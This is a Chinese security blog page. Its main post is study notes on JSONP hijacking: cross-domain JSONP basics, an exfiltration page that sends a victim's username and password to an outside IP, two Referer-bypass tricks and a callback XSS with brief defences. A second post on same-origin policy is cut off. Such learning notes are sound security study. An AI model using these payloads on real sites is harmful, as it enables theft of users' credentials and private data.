
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>离怀秋</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="离怀秋">
<meta property="og:url" content="http://yoursite.com/page/5/index.html">
<meta property="og:site_name" content="离怀秋">
<meta property="article:author" content="离怀秋">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="离怀秋" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
<link rel="stylesheet" href="/css/style.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 4.2.1"></head>
<body>
<div id="container">
  <div id="wrap">
    <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">离怀秋</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">心未死 战未败</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
          <input type="submit" value="" class="search-form-submit">
          <input name=tn type=hidden value="bds">
          <input name=cl type=hidden value="3">
          <input name=ct type=hidden value="2097152">
          <input type="hidden" name="si" value="yoursite.com">
        </form>
      </div>
    </div>
  </div>
</header>
    <div class="outer">
      <section id="main">
  
    <article id="post-前端安全学习笔记-三-JSONP劫持" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%89-JSONP%E5%8A%AB%E6%8C%81/" class="article-date">
  <time datetime="2019-07-20T06:03:02.000Z" itemprop="datePublished">2019-07-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%89-JSONP%E5%8A%AB%E6%8C%81/">前端安全学习笔记(三)-JSONP劫持</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在了解JSONP劫持前，首先了解以下JSONP跨域(因为上一篇文章讲的比较略)</p>
<h3 id="JSONP跨域"><a href="#JSONP跨域" class="headerlink" title="JSONP跨域"></a>JSONP跨域</h3><p>跨域的一些问题在上一篇文章中已经讲的比较清楚了，这里还是主要介绍JSONP，JSONP跨域巧妙的利用了script标签能跨域的特点,实现了json的跨域传输。</p>
<h4 id="JSONP原型理解"><a href="#JSONP原型理解" class="headerlink" title="JSONP原型理解"></a>JSONP原型理解</h4><p>test.html</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="comment">//回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    alert(data.message);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script type="text/</span>javascript<span class="string">" src="</span>http:<span class="comment">//120.77.174.89:10080/test.js"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>test.js</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callback(&#123;message:&quot;success&quot;&#125;);</span><br></pre></td></tr></table></figure>

<p>访问test.html</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZvOsPJ.png" alt="ZvOsPJ.png"></p>
<p><strong>上述形式也就是JSONP的原型，通过调用回调函数来返回所需要的数据。将JSON数据填充进回调函数，也就是JSONP—–JSON+Padding。</strong></p>
<p>来看一下比较官方的JSONP跨域代码—–Google的Ajax搜索方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="comment">//添加&lt;script&gt;标签的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">addScriptTag</span>(<span class="params">src</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        script.setAttribute(<span class="string">"type"</span>,<span class="string">"text/javascript"</span>);</span><br><span class="line">        script.src = src;</span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(script);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//搜索apple，将自定义的回调函数名result传入callback参数中</span></span><br><span class="line">    addScriptTag(<span class="string">"http://ajax.googleapis.com/ajax/services/search/web?v=1.0&amp;q=apple&amp;callback=result"</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//自定义的回调函数result</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">result</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//我们就简单的获取apple搜索结果的第一条记录中url数据</span></span><br><span class="line">    alert(data.responseData.results[<span class="number">0</span>].unescapedUrl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>也是同样的逻辑，利用回调函数调用result函数将数据取出，这里<strong>重点解释一下<code>window.onload</code>的作用，在<code>function addScriptTag</code>中的最后一段代码<code>document.body.appendChild(script)</code>，这个<code>script</code>标签是要放到body中的，而我们的js代码是在head中的，此时body还没有初始化完毕，所以需要window.onload先进行初始化页面,当页面一初始化完毕，立刻执行此函数方法。</strong></p>
<p>一些JSONP服务接口</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Digg API：来自 Digg 的头条新闻：</span><br><span class="line"></span><br><span class="line">　　http:<span class="comment">//services.digg.com/stories/top?appkey=http%3A%2F%2Fmashup.com&amp;type=javascript&amp;callback=?</span></span><br><span class="line"></span><br><span class="line">Geonames API：邮编的位置信息：</span><br><span class="line"></span><br><span class="line">　　http:<span class="comment">//www.geonames.org/postalCodeLookupJSON?postalcode=10504&amp;country=US&amp;callback=?</span></span><br><span class="line"></span><br><span class="line">Flickr JSONP API：载入最新猫的图片：</span><br><span class="line"></span><br><span class="line">　　http:<span class="comment">//api.flickr.com/services/feeds/photos_public.gne?tags=cat&amp;tagmode=any&amp;format=json&amp;jsoncallback=?</span></span><br><span class="line"></span><br><span class="line">Yahoo Local Search API：在邮编为 <span class="number">10504</span> 的地区搜索比萨：</span><br><span class="line"></span><br><span class="line">　　http:<span class="comment">//local.yahooapis.com/LocalSearchService/V3/localSearch?appid=YahooDemo&amp;query=pizza&amp;zip=10504&amp;results=2&amp;output=json&amp;callback=</span></span><br></pre></td></tr></table></figure>

<h4 id="jQuery的jsonp实现"><a href="#jQuery的jsonp实现" class="headerlink" title="jQuery的jsonp实现"></a>jQuery的jsonp实现</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/script&gt;  </span></span><br><span class="line"><span class="regexp">$.getJSON("http:/</span><span class="regexp">/xxx/</span>xxx?callback=?<span class="string">",function(data)&#123;        </span></span><br><span class="line"><span class="string">		alert(data.name + "</span> is a a<span class="string">" + data.sex);    </span></span><br><span class="line"><span class="string">	&#125;);</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>url后面必须要添加一个callback参数，这样getJSON方法才会知道是用JSONP方式去访问服务，callback后面的那个问号是内部自动生成的一个回调函数名。类似这个形式<code>jQuery32108394227022163139_1498134481374</code></p>
<p>如果想要自己规定函数名字，可以用以下形式的JSONP调用，实例如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">            type: <span class="string">"get"</span>,</span><br><span class="line">            url: <span class="string">"http://localhost/xxx/ProcessCallback"</span>, <span class="comment">// 这个就是不同于当前域的一个URL地址，这里单纯演示，所以同域</span></span><br><span class="line">            dataType: <span class="string">"jsonp"</span>,</span><br><span class="line">            jsonp: <span class="string">"jsonpcallback"</span>,  <span class="comment">// 指定回调函数，这里名字可以为其他任意你喜欢的，比如callback，不过必须与下一行的GET参数一致</span></span><br><span class="line">            data: <span class="string">"name=jxq&amp;email=feichexia@yahoo.com.cn&amp;jsonpcallback=?"</span>, <span class="comment">// jsonpcallback与上面的jsonp值一致</span></span><br><span class="line">            success: <span class="function"><span class="keyword">function</span> (<span class="params">json</span>) </span>&#123;</span><br><span class="line">                alert(json.Name);</span><br><span class="line">                alert(json.Email);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">)&#125;;</span><br></pre></td></tr></table></figure>

<p>这样就可以指定自己想要的回调函数名字了。</p>
<h3 id="JSONP劫持"><a href="#JSONP劫持" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h3><p>在上文中已经比较详细的说明了JSONP跨域了，那么下面就来说一下JSONP劫持了，先来一个官方定义</p>
<p>JSON 劫持又为“ JSON Hijacking ”，最开始提出这个概念大概是在 2008 年国外有安全研究人员提到这个 JSONP 带来的风险。其实这个问题属于 CSRF（ Cross-site request forgery 跨站请求伪造）攻击范畴。当某网站听过 JSONP 的方式来快域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。一个典型的 JSON Hijacking 攻击代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wooyun</span>(<span class="params">v</span>)</span>&#123;</span><br><span class="line">    alert(v.username);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script src="http:/</span><span class="regexp">/js.login.360.cn/</span>?o=sso&amp;m=info&amp;func=wooyun<span class="string">"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个是在乌云网上报告的一个攻击例子（ WooYun-2012-11284 ）<a href="http://www.wooyun.org/bug.php?action=view&amp;id=11284" target="_blank" rel="noopener">http://www.wooyun.org/bug.php?action=view&amp;id=11284</a> 当被攻击者在登陆 360 网站的情况下访问了该网页时，那么用户的隐私数据（如用户名，邮箱等）可能被攻击者劫持。<strong>也就是当用户点击此链接，则会触发我们构造wooyun函数，进行返回用户的json数据并且显示出来。</strong></p>
<p>也可以使用jQuery调用jsonp，payload如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;    </span><br><span class="line">    $.getJSON(<span class="string">"http://xxx/xxx?callback=?"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">getUsers</span>)</span>&#123;</span><br><span class="line">          alert(getUsers.name);</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>模拟场景实战：</p>
<p>test.php(储存着用户的数据)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">$jsoncallback = htmlspecialchars($_REQUEST [<span class="string">'callback'</span>]);<span class="comment">//获取回调函数名</span></span><br><span class="line"><span class="comment">//json数据</span></span><br><span class="line"><span class="comment">//$json_data = '["id","user"]';</span></span><br><span class="line">$json_data=<span class="string">'(&#123;"password":"123456","name":"lihuaiqiu"&#125;)'</span>;</span><br><span class="line"><span class="keyword">echo</span> $jsoncallback . <span class="string">"("</span> . $json_data . <span class="string">")"</span>;<span class="comment">//输出jsonp格式的数据</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>json.html恶意链接模仿用户点击</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">​        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">callbackFunction</span><span class="params">(result)</span></span></span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> password=result.password;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> username=result.name;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> xhttp;</span></span><br><span class="line"><span class="actionscript">            xhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">            xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">             <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript">           <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = <span class="keyword">this</span>.responseText;</span></span><br><span class="line">    &#125;&#125;;</span><br><span class="line"><span class="actionscript">    xhttp.open(<span class="string">"GET"</span>,<span class="string">"http://120.77.174.89:12333/?username="</span>+username+<span class="string">"&amp;password="</span>+password,<span class="literal">true</span>);</span></span><br><span class="line">  xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://139.224.236.99/test.php?callback=callbackFunction"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>本地nc监听</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZxrmsP.png" alt="ZxrmsP.png"></p>
<p>成功拿到数据。</p>
<p>其实如果只是用来漏洞验证的话，完全可以直接写一个回调函数将数据alert出来。</p>
<h4 id="JSONP劫持的挖掘手法"><a href="#JSONP劫持的挖掘手法" class="headerlink" title="JSONP劫持的挖掘手法"></a>JSONP劫持的挖掘手法</h4><p>既然知道的JSONP劫持的作用，该怎么去挖掘这种类型漏洞，这里是在圆圆师傅博客学到的在挖掘微博的JSONP劫持的思路，在他的博客中是以微博为例子的，可能是因为我菜吧…，并没有找到这个接口，于是我在腾讯视频亲爱的热爱的这部电视剧去试着寻找了一下，找到了两处，其中有一处是jQuery的调用，不过都没有敏感信息的涉及，跟着分析一下这两处的调用。</p>
<p>全局搜索callback</p>
<p><img src="https://s2.ax1x.com/2019/07/20/ZzAqTH.png" alt="ZzAqTH.png"></p>
<p>跟进_user0函数</p>
<p><img src="https://s2.ax1x.com/2019/07/20/ZzZOk4.png" alt="ZzZOk4.png"></p>
<p>跟着仔细看一下callback的json数据</p>
<p><img src="https://s2.ax1x.com/2019/07/20/Zzm7oF.png" alt="Zzm7oF.png"></p>
<p>但是这个JSON数据并不涉及一些敏感数据，但是如果我们测试出来了一些敏感信息如(<code>csrf_token,email之类的</code>)的话，接下来就可以换不同的Referer去尝试访问此链接，如果能成的话，就可以构造JSONP劫持去得到敏感信息，如上文的脚本。从这个过程来看，jsonp劫持这个名字似乎起的很恰当，本来应该是正常的网页通过函数回调来取得一些JSON数据进行一些操作，但是在没有安全验证的情况(指Referer一些的验证)，我们可以通过自己构造好的脚本来劫持掉传输的JSON的数据，所以成为JSONP劫持。</p>
<h5 id="referer的绕过手段"><a href="#referer的绕过手段" class="headerlink" title="referer的绕过手段"></a>referer的绕过手段</h5><ul>
<li>正则设置不当，通过购买适当的域名进行绕过</li>
</ul>
<p>对于<a href="http://www.qq.com/login.php?calback=cb，如果referer中的正则检测的只是域名中是否包含qq.com进行过滤，那么我们完全可以通过http://qq.com.hacker.com/hacker.html这种url进行绕过。" target="_blank" rel="noopener">http://www.qq.com/login.php?calback=cb，如果referer中的正则检测的只是域名中是否包含qq.com进行过滤，那么我们完全可以通过http://qq.com.hacker.com/hacker.html这种url进行绕过。</a></p>
<ul>
<li>空referer绕过</li>
</ul>
<p>在很多情况下，开发者在部署过滤 Referer 来源时，忽视了一个空 Referer 的过滤。一般情况下浏览器直接访问某 URL 是不带 Referer 的，所以很多防御部署是允许空 Referer 的。实例如下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:'&lt;script&gt;function JSON(o)&#123;alert(o.userinfo.userid);&#125;&lt;/script&gt;&lt;script src=http://www.qq.com/login.php?calback=JSON&gt;&lt;/script&gt;'"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>调用javascript伪协议实现空referer绕过。</p>
<h4 id="自定义回调函数产生Xss漏洞"><a href="#自定义回调函数产生Xss漏洞" class="headerlink" title="自定义回调函数产生Xss漏洞"></a>自定义回调函数产生Xss漏洞</h4><p>对于如下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$jsoncallback = $_REQUEST [<span class="string">'callback'</span>];<span class="comment">//获取回调函数名</span></span><br><span class="line"><span class="comment">//json数据</span></span><br><span class="line"><span class="comment">//$json_data = '["id","user"]';</span></span><br><span class="line">$json_data=<span class="string">'(&#123;"password":"123456","name":"lihuaiqiu"&#125;)'</span>;</span><br><span class="line"><span class="keyword">echo</span> $jsoncallback . <span class="string">"("</span> . $json_data . <span class="string">")"</span>;<span class="comment">//输出jsonp格式的数据</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可成功通过callback造成xss</p>
<p><img src="https://s2.ax1x.com/2019/07/20/ZzuQHK.png" alt="ZzuQHK.png"></p>
<p>防御手段：可以设置Conten-type为application/json或application/javascript，或者把输入的内容进行实体编码。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>jsonp劫持的思路也就是通过搜索callback之类的关键词，或者cb以及jsoncallback之类的，再次搜索调用的函数名，看一下json数据是否包含敏感的数据，如果包含的话，则可以配合不同referer加绕过过滤的方法验证是否存在，其实最好的方法还是通过脚本是FUZZ，找到的话，可以通过自己构造的脚本进行jsonp敏感信息的劫持，如得到csrf_token,可将漏洞进一步扩大化。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/#0X04-JSONP-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/#0X04-JSONP-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7</a></p>
<p><a href="https://evoa.me/index.php/archives/43/" target="_blank" rel="noopener">https://evoa.me/index.php/archives/43/</a></p>
<p><a href="http://blog.knownsec.com/2015/03/jsonp_security_technic/" target="_blank" rel="noopener">http://blog.knownsec.com/2015/03/jsonp_security_technic/</a></p>
<p><a href="https://www.cnblogs.com/chopper/archive/2012/03/24/2403945.html" target="_blank" rel="noopener">https://www.cnblogs.com/chopper/archive/2012/03/24/2403945.html</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/07/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%89-JSONP%E5%8A%AB%E6%8C%81/" data-id="ckabsu395003jkkvr9h0ga4g0" class="article-share-link" data-share="baidu" data-title="前端安全学习笔记(三)-JSONP劫持">Share</a>
      

      
        <a href="http://yoursite.com/2019/07/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%89-JSONP%E5%8A%AB%E6%8C%81/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-前端安全学习笔记-二-同源跨域产生的安全问题" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C-%E5%90%8C%E6%BA%90%E8%B7%A8%E5%9F%9F%E4%BA%A7%E7%94%9F%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" class="article-date">
  <time datetime="2019-07-20T06:01:08.000Z" itemprop="datePublished">2019-07-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C-%E5%90%8C%E6%BA%90%E8%B7%A8%E5%9F%9F%E4%BA%A7%E7%94%9F%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">前端安全学习笔记(二)-同源跨域产生的安全问题</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="同源问题"><a href="#同源问题" class="headerlink" title="同源问题"></a>同源问题</h3><p>首先引入同源策略这个概念。</p>
<blockquote>
<p><strong>同源策略</strong>（Same origin policy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了<strong>同源策略</strong>，则浏览器的正常功能可能都会受到影响。 可以说Web是构建在<strong>同源策略</strong>基础之上的，浏览器只是针对<strong>同源策略</strong>的一种实现。 <strong>同源策略</strong>，它是由Netscape提出的一个著名的安全<strong>策略</strong>。</p>
</blockquote>
<p>最初，它的含义是指，A网页设置的 Cookie，B网页不能打开，除非这两个网页”同源”。所谓”同源”指的是”三个相同”。</p>
<ul>
<li>协议相同</li>
<li>域名相同</li>
<li>端口相同</li>
</ul>
<p>如下是官方给出的检测案例：</p>
<p><img src="https://s2.ax1x.com/2019/07/18/Zjn6v6.png" alt="Zjn6v6.png"></p>
<h3 id="同源策略的目的"><a href="#同源策略的目的" class="headerlink" title="同源策略的目的"></a>同源策略的目的</h3><p>同源策略的真正目的在于保护用户的安全，防止用户数据被盗取。</p>
<p>如果没有同源策略的存在，那么可能存在如下问题：</p>
<p>当用户浏览了A网站，然后再去浏览B网站，那么B网站就有读取到A网站cookie的可能性，进而冒充用户做一些危害用户安全的事情，所以，可以通过同源策略的限制来达到保护用户安全的目的，使得B网站无法获得A网站的数据。</p>
<h4 id="同源策略的限制范围"><a href="#同源策略的限制范围" class="headerlink" title="同源策略的限制范围"></a>同源策略的限制范围</h4><p>（1） Cookie、LocalStorage 和 IndexDB 无法读取。</p>
<p>（2） DOM 无法获得。</p>
<p>（3） AJAX 请求不能发送。（Fetch请求受到限制)</p>
<p>其实真正意义上来说，AJAX的请求并非不能发送，而是在发送给服务器后，服务器在返回对应数据Respense的过程被浏览器所拦截，达到限制的目的。</p>
<h3 id="规避同源策略的几种方法"><a href="#规避同源策略的几种方法" class="headerlink" title="规避同源策略的几种方法"></a>规避同源策略的几种方法</h3><h4 id="document-domain规避"><a href="#document-domain规避" class="headerlink" title="document.domain规避"></a>document.domain规避</h4><h5 id="cookie跨域获取"><a href="#cookie跨域获取" class="headerlink" title="cookie跨域获取"></a>cookie跨域获取</h5><p>当两个网页一级域名相同，只是二级域名不同，浏览器允许通过设置<code>document.domain</code>共享 Cookie。</p>
<p>如A网页：<code>http://aaa.huaiqiu.com</code> , B网页：<code>http://bbb.huaiqiu.com</code></p>
<p>那么在设置document.domain=<a href="http://www.huaiqiu.com的情况下，如下通过document.cookie给A网页设置了一个cookie：name">http://www.huaiqiu.com的情况下，如下通过document.cookie给A网页设置了一个cookie：name</a>: Hello，那么在B网页就可以通过document.cookie读取到A网页的cookie，达到跨域目的。</p>
<h5 id="iframe跨域获取"><a href="#iframe跨域获取" class="headerlink" title="iframe跨域获取"></a>iframe跨域获取</h5><p><strong>所谓iframe跨域并不是指只通过src属性把所需要的页面拿过来，而是只与拿过来的页面进行数据间的交互。</strong>更具体的例子如下：</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZjjmqK.png" alt="ZjjmqK.png"></p>
